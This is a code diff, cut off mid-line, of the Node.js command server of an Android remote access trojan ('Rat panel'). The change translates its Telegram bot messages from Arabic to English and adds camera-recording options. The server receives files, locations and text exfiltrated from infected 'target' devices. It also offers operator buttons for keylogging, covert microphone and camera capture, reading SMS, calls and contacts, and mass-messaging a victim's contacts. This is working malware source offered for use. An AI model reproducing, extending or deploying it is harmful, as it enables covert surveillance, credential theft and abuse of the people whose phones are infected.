@@ -74,7 +74,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
       if ( err ) console.log('ERROR: ' + err);
     });
-    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
+    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
 /*
    {
      parse_mode: "HTML",
@@ -89,11 +89,11 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
 })
 
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body['text'],
+    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'],
     {
       parse_mode: "HTML",
         "reply_markup": {
-          "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
           'resize_keyboard': true
     }
 },  {parse_mode: "HTML", disable_web_page_preview: true})
@@ -101,11 +101,11 @@ app.post("/uploadText", (req, res) => {
 })
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> جهاز`,
+    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
     {
       parse_mode: "HTML",
         "reply_markup": {
-          "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
           'resize_keyboard': true
     }
 },  {parse_mode: "HTML"})
@@ -169,8 +169,8 @@ appBot.on('message', (message) => {
             currentNumber = ''
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
@@ -182,12 +182,12 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
 
-        if (message.reply_to_message.text.includes('°•أدخل الرابط الذي تريد إرساله')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙')) {
             const message_to_all = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -196,11 +196,11 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
-        if (message.reply_to_message.text.includes('°• أدخل النص المراد نطقه')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠')) {
             const message_to_tts = message.text
             const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' + encodeURIComponent(message_to_tts)
             appSocket.clients.forEach(function each(ws) {
@@ -210,8 +210,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
 
@@ -226,8 +226,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
@@ -239,8 +239,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
@@ -252,8 +252,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
@@ -265,8 +265,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
@@ -278,8 +278,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
@@ -291,8 +291,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
@@ -313,8 +313,8 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
         if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
@@ -326,44 +326,35 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطورايهاب الحوباني  𝗘𝗛𝗔𝗕 ،'
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ'
             )
         }
     }
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                 '°• مرحبا بكم في بوت الاختراق مطور البوتايهاب الحوباني  𝗘𝗛𝗔𝗕
-
-' +
-                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال
-
-' +
-                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر
-
-' +
-                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر
-
-' +
-                '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
+                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
+                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
+                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
+                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
+                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n' +
+                '• ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @shivayadavv / @hackdagger & https://github.com/Did-Dog',
                 {
                     parse_mode: "HTML",
                     disable_web_page_preview: true,
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.text == 'الاجهزة المتصلة') {
+        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                   '°• لا توجد اجهزة متصلة ومتوفرة
-
-' +
-                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                 )
             } else {
                 let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
@@ -377,13 +368,11 @@ appBot.on('message', (message) => {
                 appBot.sendMessage(id, text, {parse_mode: "HTML"})
             }
         }
-        if (message.text == 'تنفيذ الامر') {
+        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
-                   '°• لا توجد اجهزة متصلة ومتوفرة
-
-' +
-                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                 )
             } else {
                 const deviceListKeyboard = []
@@ -401,7 +390,7 @@ appBot.on('message', (message) => {
             }
         }
     } else {
-        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
+        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
     }
 })
 appBot.on("callback_query", (callbackQuery) => {
@@ -411,73 +400,77 @@ appBot.on("callback_query", (callbackQuery) => {
     const uuid = data.split(':')[1]
     console.log(uuid)
     if (commend == 'device') {
-        appBot.editMessageText(`°• حدد الثناء للجهاز  : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
             width: 10000,
             chat_id: id,
             message_id: msg.message_id,
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: 'التطبيقات', callback_data: `apps:${uuid}`},
-                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
+                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
+                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: 'الحصول علئ الملفات', callback_data: `file:${uuid}`},
-                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
+                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
+                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`},
-                        {text: 'المكرفون', callback_data: `microphone:${uuid}`},
+                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
+                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                     ],
                     [
-                        {text: 'الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
-                        {text: 'الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
+                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
+                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: 'الموقع', callback_data: `location:${uuid}`},
-                        {text: 'نخب', callback_data: `toast:${uuid}`}
+                        {text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_main:${uuid}`},
+                        {text: '𝙍𝙚𝙘𝙤𝙧𝙙 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `rec_camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: 'المكالمات', callback_data: `calls:${uuid}`},
-                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
+                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
+                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                     ],
                     [
-                        {text: 'يهتز', callback_data: `vibrate:${uuid}`},
-                        {text: 'اظهار الاخطار', callback_data: `show_notification:${uuid}`}
-                    ],
-                   [
-                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
-                        {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`}
+                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
+                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                     ],
                     [
-                        {text: 'تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
-                        {text: 'ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
+                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
+                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
+                    ],
+                    [
+                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
+                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
+                    ],
+                    [
+                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
+                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                     ],
                     [
                         {text: '🔥', callback_data: `my_fire_emoji:${uuid}`},
-                        {text: 'لقطة شاشة', callback_data: `screenshot:${uuid}`},
+                        {text: '𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩', callback_data: `screenshot:${uuid}`},
                     ],
                     [
-                        {text: 'تشغيل المصباح', callback_data: `torch_on:${uuid}`},
-                        {text: 'إيقاف المصباح', callback_data: `torch_off:${uuid}`},
+                        {text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙣', callback_data: `torch_on:${uuid}`},
+                        {text: '𝙏𝙤𝙧𝙘𝙝 𝙊𝙛𝙛', callback_data: `torch_off:${uuid}`},
                     ],
                     [
-                        {text: 'تشغيل مسجل المفاتيح', callback_data: `keylogger_on:${uuid}`},
-                        {text: 'إيقاف تشغيل تسجيل', callback_data: `keylogger_off:${uuid}`},
+                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙣', callback_data: `keylogger_on:${uuid}`},
+                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙛𝙛', callback_data: `keylogger_off:${uuid}`},
                     ],
                     [
-                        {text: 'فتح رابط الهدف', callback_data: `open_target_link:${uuid}`},
-                        {text: 'تحويل النص إلى كلام', callback_data: `text_to_speech:${uuid}`},
+                        {text: '𝙊𝙥𝙚𝙣 𝙏𝙖𝙧𝙜𝙚𝙩 𝙇𝙞𝙣𝙠', callback_data: `open_target_link:${uuid}`},
+                        {text: '𝙏𝙚𝙭𝙩 𝙏𝙤 𝙎𝙥𝙚𝙚𝙘𝙝', callback_data: `text_to_speech:${uuid}`},
                     ],
                     [
                         {
-                            text: 'إرسال رسالة إلى جميع جهات الاتصال الـ',
